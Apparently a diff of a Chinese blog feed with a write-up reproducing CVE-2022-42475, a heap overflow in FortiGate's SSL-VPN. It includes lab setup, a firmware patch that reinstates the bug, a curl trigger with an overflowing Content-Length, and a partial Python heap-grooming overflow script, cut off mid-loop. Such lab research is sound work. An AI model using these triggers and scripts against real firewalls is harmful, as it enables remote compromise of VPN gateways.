+data += b&quot;Host: 192.168.150.9\r\n&quot;
+data += f&quot;Content-Length: {len(body)}\r\n&quot;.encode(&quot;utf-8&quot;)
+data += b&quot;\r\n&quot;
+data += body
+</code></pre>
+<p>一开始没能成功堆喷</p>
+<figure data-type="image" tabindex="23"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607142926726.png" alt="image-20240607142926726" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607145049053.png" alt="image-20240607145049053" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607150557994.png" alt="image-20240607150557994" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607150656418.png" alt="image-20240607150656418" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607150831110.png" alt="image-20240607150831110" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20240607150936603.png" alt="image-20240607150936603" loading="lazy"></figure>
+<p>成功走到call system，后面的步骤感觉就是和前两个漏洞一样，找gadget构造ROP，基本一致</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-42475 复现 总结]]></title>
+        <id>https://augu5tu.github.io/post/cve-2022-42475-reproduction-summary/</id>
+        <link href="https://augu5tu.github.io/post/cve-2022-42475-reproduction-summary/">
+        </link>
+        <updated>2024-03-25T08:21:28.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>经历了快两三个月，终于将这个漏洞复现完成，中间因为无法联调的问题浪费了大部分时间，所幸拨得云开见月明，总结一下，希望给后面尝试复现这个漏洞的人一些帮助。
+</code></pre>
+<h1 id="搭载运行环境">搭载运行环境</h1>
+<p>​	第一步应该是下载FortiGate的虚拟机镜像，网上大部分教程都是7.2.4的版本，官网在不断地更新固件，这个版本可能不太好下载了，这里附一个<a href="https://pan.baidu.com/s/1F13NLpdIvjyJko1_GqV-kQ?pwd=gyd7">7.2.4版本的ova</a>，双击导入即可</p>
+<p>​	导入后，网上许多教程建议将虚拟网卡绑到nat，事实上完全可以省去这一步骤，网络适配器可以选择性移除到只留一个（不移除也没有问题）</p>
+<p>​	启动后，使用admin+空密码登录，然后设置新密码</p>
+<p>​	由于上一步我们省去了绑定的步骤，所以这里需要运行一条命令获取虚拟机的IP地址，事实上，FortiGate防火墙上可用的命令并不多，而且和我们通常熟悉的命令并不相同，这也为我们后面的工作造成了一些障碍，言归正传，输入命令<code>get system interface physical</code>，获取IP</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325165300930.png" alt="image-20240325165300930" loading="lazy"></figure>
+<p>在浏览器中输入IP地址进行访问，找到 VPN/SSL-VPN Settings，设置好 SSL-VPN 相关的内容</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325165923256.png" alt="image-20240325165923256" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325170105046.png" alt="image-20240325170105046" loading="lazy"></figure>
+<p>如果有问题，可以访问<a href="https://i3r0nya.cn/wiki/note/reverse/cve-2022-42475/">这篇博客</a>的配置部分，相当详细</p>
+<p>之后访问 sslvpn 的端口，就会出现 vpn 登录页面，我上面设置的端口是10443，ip是192.168.150.9，所以我应该访问192.168.150.9:10443，如果你能正确访问，那么下面的部分可以直接跳过</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325170424792.png" alt="image-20240325170424792" loading="lazy"></figure>
+<p>但或许你会看到如下界面，请别紧张，有可能是你的配置错误，可以按照上面的步骤仔细检查，也有可能是tls版本的问题，在FortiGate官方文档中，写明支持tls 1.3版本，但实际测试中没有相关选项，只有tls 1.0</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203841777.png" alt="image-20231221203841777" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203820776.png" alt="image-20231221203820776" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203447059.png" alt="image-20231221203447059" loading="lazy"></figure>
+<p>这里我尝试使用edge浏览器的IE兼容模式，也不能连接，直到将tls 1.0选项勾选才能看到web界面</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/Augu5tu/picture/img/image-20231221204134910.png" alt="image-20231221204134910" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221203957389.png" alt="image-20231221203957389" loading="lazy"></figure>
+<p>点击转到此网页</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20231221204009531.png" alt="image-20231221204009531" loading="lazy"></figure>
+<p>环境搭建就此完成</p>
+<h1 id="搭建调试和漏洞环境">搭建调试和漏洞环境</h1>
+<p>在7.2.3中，我们所想复现的这个漏洞已经被修复，所以需要通过二进制 patch，去掉漏洞的补丁。</p>
+<h2 id="提取二进制">提取二进制</h2>
+<p>二进制程序位于虚拟机磁盘文件中，使用 vmware workstation （Linux 虚拟机）挂载 fortinet 虚拟机的磁盘文件，在虚拟机中挂载分区。</p>
+<p>这里我展示一下如何操作</p>
+<p>首先，VMware中找到FortiGate虚拟机（先关机），点击<code>编辑虚拟机设置</code>，找到较小的硬盘，复制文件地址</p>
+<img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325171416114.png" alt="image-20240325171416114" style="zoom:80%;" />
+<p>然后使用另一台虚拟机（最好选择一台不是调试用的，这段操作你可能要重复很多次，建议一台常用虚拟机用于调试，一台用于完成文件操作，后一台在FortiGate虚拟机开启时关闭，这样就避免了频繁在虚拟机配置页面卸载装载硬盘），如法炮制，同样的界面，选择添加-&gt;硬盘-&gt;下一步-&gt;使用现有虚拟磁盘-&gt;将刚刚复制的磁盘地址粘贴到地址框内-&gt;点击完成</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325171555293.png" alt="image-20240325171555293" loading="lazy"></figure>
+<p>这时候再开机，可以看到文件系统中存在FORTIOS 分区</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/Augu5tu/picture/main/img/image-20240325172208070.png" alt="image-20240325172208070" loading="lazy"></figure>
+<p>​	主要业务二进制位于 FORTIOS 分区的 rootfs.gz 打包文件中，如果你使用的是高版本Ubuntu系统，这里可以直接使用图形化界面完成解压操作，即右键-&gt;提取到，选择一个易于记忆的位置存放文件，如果不是，使用 gzip + cpio 解压后会出现结果 .tar 文件，使用 rootfs 下的 xz 和 ftar 解压这些文件。</p>
+<pre><code>sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
+sudo chroot . /sbin/ftar -xf /bin.tar
+sudo chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz
+sudo chroot . /sbin/ftar -xf /migadmin.tar
+sudo chroot . /sbin/xz --check=sha256 -d /usr.tar.xz
+sudo chroot . /sbin/ftar -xf /usr.tar
+</code></pre>
+<h3 id="搭建gdb调试环境">搭建GDB调试环境</h3>
+<p>​	登录虚拟机console后，拿到的是一个受限的命令行界面，无法执行 shell 命令，我们需要通过 patch 文件系统和二进制来获取 shell 执行环境。</p>
+<p>这里可以直接看<a href="https://forum.butian.net/share/2166">这篇博客</a>，我不想写了</p>
+<p>在patch完，重打包， GDB 调试 Fortios 系统内核的步骤中，你可能并不能像网上的许多博客一样可以成功下端点修改返回值，这里推荐看我的<a href="https://blog.augustu.top/post/vmware-debug/">上一篇博客</a></p>
+<p>在启动以后，执行<code>diagnose hardware smartctl</code>命令，激活后门以后，执行<code>get system interface physical</code>找到FortiGate的ip</p>
+<p>在 FortiGate 上开启一个调试端口，方便本地 gdb 远程连接到服务器上进行调试</p>
+<p>使用 <code>busybox ps -a</code> 命令查看所有的进程 pid，确定 sslvpn 的 pid，接着执行命令附加调试</p>
+<pre><code class="language-bash">/ # busybox ps -a |grep sslvpn
+ 2507 0         0:00 /bin/sslvpnd
+ 2719 0         0:00 grep sslvpn
+/ # gdbserver :80 --attach 2507
+Attached; pid = 2507
+Listening on port 80
+</code></pre>
+<p>再在终端中开启GDB远程调试：<code>gdb-peda$ target remote 192.168.150.131:80</code></p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<h2 id="漏洞探寻">漏洞探寻</h2>
+<p>漏洞位于如下函数处：</p>
+<pre><code class="language-c">// 这个函数负责从 POST 请求体中读取输入，其基本逻辑：
+// 首先获取到用户提交的 Content-Length 值，传入 pool_alloc 函数中分配内存空间，之后使用 memcpy 将用户数据拷贝到刚刚分配的内存中。
+__int64 __fastcall sslvpn_read_post_data_cb(_QWORD *a1)
+{
+  __int64 *v1; // r12
+  sslvpn_context *v2; // rax
+  __int64 v3; // rcx
+  int v4; // r8d
+  int v5; // r9d
+  sslvpn_context *ctx; // rbx
+  __int64 v7; // rax
+  size_t v8; // r12
+  signed __int64 sock_buffer; // rdi
+  signed __int64 content_length; // rax
+  signed __int64 v11; // r12
+  char *v13; // rax
+
+  v1 = (__int64 *)a1[92];
+  v2 = (sslvpn_context *)sub_181BDC0(a1[83]);
+  ctx = v2;
+  if ( v2-&gt;content || (v13 = pool_alloc(*v1, v2-&gt;content_length + 1), (ctx-&gt;content = (uint64_t)v13) != 0) )
+  {
+    v7 = sub_16E6130((__int64)v1, (__int64)&amp;ctx[1], 8190LL, v3, v4, v5);
+    v8 = v7;
+    if ( v7 )
+    {
+      if ( v7 &lt; 0 )
+      {
+        if ( (unsigned int)sub_16DCA50(a1[77]) - 1 &lt;= 4 )
+          return 0LL;
+      }
+      else
+      {
+        sock_buffer = ctx-&gt;sock_buffer;
+        content_length = ctx-&gt;content_length;
+        if ( (__int64)(sock_buffer + v8) &gt; content_length )
+          v8 = ctx-&gt;content_length - sock_buffer;
+        if ( sock_buffer &lt; content_length )
+        {
+          memcpy((void *)(ctx-&gt;content + sock_buffer), &amp;ctx[1], v8);
+          sock_buffer = ctx-&gt;sock_buffer;
+          content_length = ctx-&gt;content_length;
+        }
+        v11 = sock_buffer + v8;
+        ctx-&gt;sock_buffer = v11;
+        if ( v11 &lt; content_length )
+          return 0LL;
+      }
+    }
+    return 2LL;
+  }
+  return 7LL;
+}
+</code></pre>
+<p>最主要的是<code>v13 = pool_alloc(*v1, v2-&gt;content_length + 1</code>这里</p>
+<p>这里我使用的是7.2.4版本的FortiGate，此版本漏洞已经被修复完毕</p>
+<p>调用``pool_alloc`函数处汇编代码如下：</p>
+<pre><code class="language-assembly">.text:0000000001811128 loc_1811128:                            ; CODE XREF: sslvpn_read_post_data_cb+29↑j
+.text:0000000001811128                 mov     rax, [rax+18h]
+.text:000000000181112C                 mov     rdi, [r12]
+.text:0000000001811130                 lea     rsi, [rax+1]
+.text:0000000001811134                 call    pool_alloc
+</code></pre>
+<p>老版本此处调用代码如下：</p>
+<pre><code class="language-assembly">mov     eax, [rax+18h] // DWORD(ctx-&gt;content_length)
+mov     rdi, [r12]
+lea     esi, [rax+1]  // DWORD(ctx-&gt;content_length) + 1
+movsxd  rsi, esi
+call    alloc
+</code></pre>
+<p>在老版本中，当CL值被存入eax寄存器时，因为eax寄存器最多只能存储32位，以及后面会对地址进行拓展+1的操作，所以会存在溢出可能性，举例：</p>
+<p>当提供的 content_length 为 0x1b00000000 时，由于 <code>DWORD(ctx-&gt;content_length) = 0</code> ，因此实际申请内存为 1 字节，而下面做内存拷贝时取到的 content-length 为 0x1b00000000，从而导致<strong>堆溢出漏洞</strong>。</p>
+<p>但因为使用的不是老版本固件，所以需要进行patch，具体方式参考<a href="https://forum.butian.net/share/2166">此文章</a></p>
+<p>这里我使用的师兄patch后的版本</p>
+<pre><code class="language-assembly">.text:0000000001811128 loc_1811128:                            ; CODE XREF: sslvpn_read_post_data_cb+29↑j
+.text:0000000001811128                 jmp     short loc_1811174
+.text:0000000001811128 ; ---------------------------------------------------------------------------
+.text:000000000181112A                 align 4
+.text:000000000181112C                 call    qword ptr [rax-6F6F6F70h]
+.text:0000000001811132                 nop
+.text:0000000001811133                 nop
+.text:0000000001811134
+.text:0000000001811134 loc_1811134:                            ; CODE XREF: sub_16E5DC0+21D↑j
+.text:0000000001811134                                         ; sslvpn_read_post_data_cb+527↓j
+.text:0000000001811134                 call    pool_alloc
+......
+
+.text:0000000001811174 loc_1811174:                            ; CODE XREF: sslvpn_read_post_data_cb:loc_1811128↑j
+.text:0000000001811174                 mov     eax, [rax+18h]
+.text:0000000001811177                 mov     rdi, [r12]
+.text:000000000181117B                 jmp     loc_1811406
+......
+
+.text:0000000001811406 loc_1811406:                            ; CODE XREF: sslvpn_read_post_data_cb+FB↑j
+.text:0000000001811406                 lea     esi, [rax+1]
+.text:0000000001811409                 jmp     loc_18115A4
+......
+
+
+.text:00000000018115A4 loc_18115A4:                            ; CODE XREF: sslvpn_read_post_data_cb+389↑j
+.text:00000000018115A4                 movsxd  rsi, esi
+.text:00000000018115A7                 jmp     loc_1811134
+......
+
+.text:0000000001811134 loc_1811134:                            ; CODE XREF: sub_16E5DC0+21D↑j
+.text:0000000001811134                                         ; sslvpn_read_post_data_cb+527↓j
+.text:0000000001811134                 call    pool_alloc
+......
+</code></pre>
+<pre><code>curl --noproxy '*' --data-binary @payload -H 'Content-Length: 115964116992' -vik 'https://192.168.150.131:10443/remote/logincheck?AAAA=BBBB'
+</code></pre>
+<p>这里存在整数溢出。那么我们可以构造特殊的 CL 值，比如 0x1b00000000，经过运算拓展之后会变成 0x1，在运行到<code>pool_alloc</code>函数的时候（注意，此函数被调用了很多次，建议运行到漏洞函数以后再在<code>memset</code>函数处下断点观察）分配内存如下：</p>
+<pre><code class="language-bash">Breakpoint 3, 0x00000000016d1bad in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────*RAX  0x7fc0cc200448 ◂— 0x0
+*RBX  0x8
+ RCX  0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 —▸ 0x7fc0cc0d64f0 ◂— 0x7fc0cc0b7a18
+*RDX  0x1
+*RDI  0x7fc0cc200440 ◂— 0x0
+*RSI  0x0
+ R8   0x7fc0cc200440 ◂— 0x0
+ R9   0x0
+ R10  0x0
+ R11  0x246
+ R12  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
+*R13  0x1
+ R14  0x0
+ R15  0x7fc0cc0d64f0 —▸ 0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 ◂— 0x7fc0cc0d64f0
+*RBP  0x7ffd87902f00 —▸ 0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 ◂— ...
+*RSP  0x7ffd87902ee0 ◂— 0x0
+*RIP  0x16d1bad ◂— call 0x43c500
+─────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x16d1bad    call   memset@plt                      &lt;memset@plt&gt;
+        s: 0x7fc0cc200440 ◂— 0x0
+        c: 0x0
+        n: 0x1
+ 
+   0x16d1bb2    mov    r8, rax
+   0x16d1bb5    add    rsp, 8
+   0x16d1bb9    mov    rax, r8
+   0x16d1bbc    pop    rbx
+   0x16d1bbd    pop    r12
+   0x16d1bbf    pop    r13
+   0x16d1bc1    pop    rbp
+   0x16d1bc2    ret    
+ 
+   0x16d1bc3    nop    dword ptr [rax + rax]
+   0x16d1bc8    mov    eax, dword ptr [rip + 0x940f5b6]
+───────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────00:0000│ rsp 0x7ffd87902ee0 ◂— 0x0
+01:0008│-018 0x7ffd87902ee8 —▸ 0x7fc0cc0fd018 —▸ 0x7fc0ccc54ae8 —▸ 0x7fc0cc0d62f0 —▸ 0x7fc0cc1fe018 ◂— ...
+02:0010│-010 0x7ffd87902ef0 —▸ 0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 ◂— ...
+03:0018│-008 0x7ffd87902ef8 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
+04:0020│ rbp 0x7ffd87902f00 —▸ 0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 ◂— ...
+05:0028│+008 0x7ffd87902f08 —▸ 0x1811139 ◂— mov qword ptr [rbx + 8], rax
+06:0030│+010 0x7ffd87902f10 ◂— 0x0
+07:0038│+018 0x7ffd87902f18 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
+─────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────── ► 0        0x16d1bad
+   1        0x1811139
+   2        0x180ab0d
+   3        0x180c1c0
+   4        0x180c29e
+   5        0x180c7b1
+   6        0x180da5c
+   7        0x180ede2
+</code></pre>
+<p>缓冲区是位于 heap 的一块较小内存，而 size 已经变成 0x1。</p>
+<p>这样 <code>pool_alloc</code> 返回了一块较小的堆内存，假设此时我们在 POST 请求体中构造了超长的数据，那么在后续的 <code>memcpy</code> 阶段就会导致堆内存溢出。</p>
+<pre><code class="language-bash">Breakpoint 4, 0x0000000001811162 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────*RAX  0x1b00000000
+*RBX  0x7fc0cc0fd018 —▸ 0x7fc0ccc54ae8 —▸ 0x7fc0cc0d62f0 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 ◂— ...
+*RCX  0x1ffe
+*RDX  0x1ffe
+ RDI  0x7fc0cc200440 ◂— 0x0
+*RSI  0x7fc0cc0fd038 ◂— 0x4141414141414141 ('AAAAAAAA')
+*R8   0x16
+*R9   0x7fc0cc0fd080 ◂— 0x4141414141414141 ('AAAAAAAA')
+*R10  0x7fc0cc0bdfb0 ◂— 0x0
+*R11  0x7fc0cc0ff016 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+*R12  0x1ffe
+*R13  0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 —▸ 0x7fc0cc0b7c00 ◂— ...
+*R14  0x7fc0cc0fd038 ◂— 0x4141414141414141 ('AAAAAAAA')
+ R15  0x7fc0cc0d64f0 —▸ 0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 ◂— 0x7fc0cc0d64f0
+*RBP  0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 —▸ 0x7ffd87905120 ◂— ...
+*RSP  0x7ffd87902f10 ◂— 0x0
+*RIP  0x1811162 ◂— call 0x4404a0
+─────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x1811162    call   memcpy@plt                      &lt;memcpy@plt&gt;
+        dest: 0x7fc0cc200440 ◂— 0x0
+        src: 0x7fc0cc0fd038 ◂— 0x4141414141414141 ('AAAAAAAA')
+        n: 0x1ffe
+ 
+   0x1811167    mov    rdi, qword ptr [rbx + 0x10]
+   0x181116b    mov    rax, qword ptr [rbx + 0x18]
+   0x181116f    jmp    0x18110e7                     &lt;0x18110e7&gt;
+ 
+   0x1811174    mov    eax, dword ptr [rax + 0x18]
+   0x1811177    mov    rdi, qword ptr [r12]
+   0x181117b    jmp    0x1811406                     &lt;0x1811406&gt;
+ 
+   0x1811180    push   rbp
+   0x1811181    mov    rbp, rsp
+   0x1811184    push   r14
+   0x1811186    push   r13
+───────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────00:0000│ rsp 0x7ffd87902f10 ◂— 0x0
+01:0008│-018 0x7ffd87902f18 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
+02:0010│-010 0x7ffd87902f20 —▸ 0x7fc0cc0b79b8 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
+03:0018│-008 0x7ffd87902f28 ◂— 0x0
+04:0020│ rbp 0x7ffd87902f30 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 —▸ 0x7ffd87905120 ◂— ...
+05:0028│+008 0x7ffd87902f38 —▸ 0x180ab0d ◂— mov rcx, qword ptr [rbp - 0x38]
+06:0030│+010 0x7ffd87902f40 —▸ 0x7ffd87902f50 —▸ 0x7ffd87902f80 —▸ 0x7ffd87902fb0 —▸ 0x7ffd87902fe0 ◂— ...
+07:0038│+018 0x7ffd87902f48 —▸ 0x7fc0cc0b7a18 —▸ 0x7fc0cc0d6418 —▸ 0x7fc0cc0d64f0 ◂— 0x7fc0cc0b7a18
+─────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────── ► 0        0x1811162
+   1        0x180ab0d
+   2        0x180c1c0
+   3        0x180c29e
+   4        0x180c7b1
+   5        0x180da5c
+   6        0x180ede2
+   7         0x449eaf
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; 
+</code></pre>
+<p>但 函数 <code>sslvpn_read_post_data_cb</code> 是一个回调函数，用于处理通过 SSL VPN 接收到的 POST 请求数据。它不是一次性处理所有数据，而是被<strong>循环调用</strong>来读取和处理数据块，直到整个请求体被处理完毕或发生错误。</p>
+<p>我们的 <code>payload</code> 非常大 (100000 字节)，远超单次读取的 8190 字节，所以 <code>sslvpn_read_post_data_cb</code> 被反复调用，每次处理一小块数据，直到所有数据都被（尝试）拷贝。</p>
+<p>经过多次循环调用 <code>sslvpn_read_post_data_cb</code> 和 <code>memcpy</code>，堆内存已经被大量覆盖。</p>
+<p>程序继续执行其他逻辑。</p>
+<p>最终在 <code>0x16e3c27: movzx eax, byte ptr [r14 + 0x41]</code> 处崩溃。</p>
+<pre><code class="language-bash">pwndbg&gt; 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000016e3c27 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────── RAX  0x7fc0cc200e28 ◂— 0x4141414141414141 ('AAAAAAAA')
+ RBX  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
+ RCX  0x68
+ RDX  0x0
+ RDI  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
+ RSI  0x323e9c3 ◂— 'text/html; charset=utf-8'
+ R8   0x0
+ R9   0x0
+ R10  0x7fc0d1adf020 (__strcasecmp_l_avx+4880) ◂— vpslldq xmm2, xmm2, 2
+ R11  0x0
+ R12  0x323e9c3 ◂— 'text/html; charset=utf-8'
+ R13  0xaaf50e0 ◂— 'Fortinet_Factory'
+ R14  0x4141414141414141 ('AAAAAAAA')
+ R15  0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 —▸ 0x7fc0cc1fe800 ◂— ...
+ RBP  0x7ffd87902ec0 —▸ 0x7ffd87902f10 —▸ 0x7ffd87902f70 —▸ 0x7ffd87902f90 —▸ 0x7ffd87902fe0 ◂— ...
+ RSP  0x7ffd87902e80 —▸ 0x3685072 ◂— 'text/plain'
+ RIP  0x16e3c27 ◂— movzx eax, byte ptr [r14 + 0x41]
+─────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────── ► 0x16e3c27    movzx  eax, byte ptr [r14 + 0x41]
+   0x16e3c2c    and    eax, 0x18
+   0x16e3c2f    cmp    al, 8
+   0x16e3c31    je     0x16e3c60                     &lt;0x16e3c60&gt;
+    ↓
+   0x16e3c60    mov    esi, 0x316001f
+   0x16e3c65    mov    rdi, r12
+   0x16e3c68    call   0x16f3d70                     &lt;0x16f3d70&gt;
+ 
+   0x16e3c6d    test   rax, rax
+   0x16e3c70    jne    0x16e3c33                     &lt;0x16e3c33&gt;
+ 
+   0x16e3c72    lea    r13, [rbp - 0x40]
+   0x16e3c76    mov    esi, 0x3685072
+───────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────00:0000│ rsp 0x7ffd87902e80 —▸ 0x3685072 ◂— 'text/plain'
+01:0008│-038 0x7ffd87902e88 —▸ 0x2f7fc4a ◂— 'text/html'
+02:0010│-030 0x7ffd87902e90 ◂— 0x0
+03:0018│-028 0x7ffd87902e98 ◂— 0xbcc68fe117a6a700
+04:0020│-020 0x7ffd87902ea0 —▸ 0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 ◂— ...
+05:0028│-018 0x7ffd87902ea8 —▸ 0x7fc0cc1fe058 —▸ 0x7fc0cc1fe018 —▸ 0x7fc0cc1fe000 —▸ 0x7fc0cc1fe400 ◂— ...
+06:0030│-010 0x7ffd87902eb0 —▸ 0xaaf50e0 ◂— 'Fortinet_Factory'
+07:0038│-008 0x7ffd87902eb8 —▸ 0x7fc0ccc54800 —▸ 0x7fc0cc0b7418 —▸ 0x7fc0cc0b7400 —▸ 0x7fc0cc0b7800 ◂— ...
+─────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────── ► 0        0x16e3c27
+   1        0x16e5923
+   2        0x16e733e
+   3        0x180a0cf
+   4        0x180c505
+   5        0x180c782
+   6        0x180da5c
+   7        0x180ede2
+──────────────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<p>此时，查看寄存器 <code>R14</code> 的值是 <code>0x4141414141414141</code> ('AAAAAAAA')。</p>
+<p>这<strong>明确地表明</strong>：之前的堆溢出已经覆盖了某个变量或指针，该变量/指针的值后来被加载到了 <code>R14</code> 寄存器中。现在，程序试图将 <code>R14</code> (即 <code>0x4141...</code>) 当作一个基地址，并尝试读取 <code>[R14 + 0x41]</code> 处的内存。由于 <code>0x4141...</code> 是一个无效的、由输入数据控制的地址，访问它自然会导致<strong>段错误 (Segmentation Fault)</strong>。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="劫持函数指针">劫持函数指针</h3>
+<p>随便填充数据的话，最后很难达到一个可以利用的crash，我看<a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">Catalpa</a>这里直接就能触发<code>jmp rax</code>感觉还是挺不可思议的，我试了很多次，基本只能跳转到上面的<code>movzx  eax, byte ptr [r14 + 0x41]</code></p>
+<p>那应该怎么才能成功劫持一个函数指针呢？</p>
+<p>这里我试了很多方法，感觉还是<a href="https://forum.butian.net/share/2166">hac425</a>的思路稳定清晰，易于实现</p>
+<p>简单来说，还是使用堆风水手法</p>
+<p>文章中给出了完整的漏洞利用思路，这里我先拆开，单说如何成功劫持函数指针（应该是<code>handshake</code>函数的指针，orange的文章里有提到过）</p>
+<ol>
+<li>创建 60 个 sock 连接，并发送不完整的 http 请求，希望能在服务端分配多个 SSL 结构体</li>
+<li>从第 40 个开始间隔释放 10 个 sock 链接，希望在服务端释放几个 SSL 结构体的 Hole.</li>
+<li>分配用于溢出的 exp_sk</li>
+<li>再分配 20 个 sock 连接，多分配几个 SSL 结构体</li>
+<li>触发溢出，希望修改 SSL 结构体中的函数指针</li>
+<li>给其他 socket 发送数据，等待函数指针调用</li>
+</ol>
+<p>这里给出溢出脚本：</p>
+<pre><code class="language-python">import socket
+import ssl
+from pwn import *
+ 
+ 
+path = &quot;/remote/login&quot;.encode()
+ 
+ip = &quot;192.168.150.131&quot;
+port = 10443
+ 
+def create_ssl_ctx():
+    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    _socket.connect((ip, port))
+    _default_context = ssl._create_unverified_context()
+    _socket = _default_context.wrap_socket(_socket)
+    return _socket
+ 
+ 
+socks = []
+ 
+for i in range(60):
+    sk = create_ssl_ctx()
+    data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: 4096\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;
+    sk.sendall(data)
+    socks.append(sk)
+    #sleep(1)
+ 
+for i in range(20, 40, 2):
+    sk = socks[i]
+    sk.close()
+    socks[i] = None
+ 
+CL = &quot;115964116992&quot;
+data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.150.131\r\nContent-Length: &quot; + CL.encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;
+
+exp_sk = create_ssl_ctx()
+ 
+for i in range(20):
